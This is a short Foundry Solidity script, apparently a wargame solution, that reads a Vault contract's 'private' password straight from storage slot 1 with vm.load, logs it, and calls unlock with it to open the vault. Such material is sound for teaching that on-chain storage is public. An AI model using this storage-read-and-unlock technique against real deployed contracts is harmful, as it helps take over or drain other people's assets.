// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";

contract CounterScript is Script {

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Vault vault = Vault(0x742Ea42ecf779225e4736dd52d15E4CF6CAa6Ea8);
        uint256 value = 1;
        bytes32 password = vm.load(0x742Ea42ecf779225e4736dd52d15E4CF6CAa6Ea8, bytes32(value));
        console.logBytes32(password);
        vault.unlock(password);
        vm.stopBroadcast();

    }
}
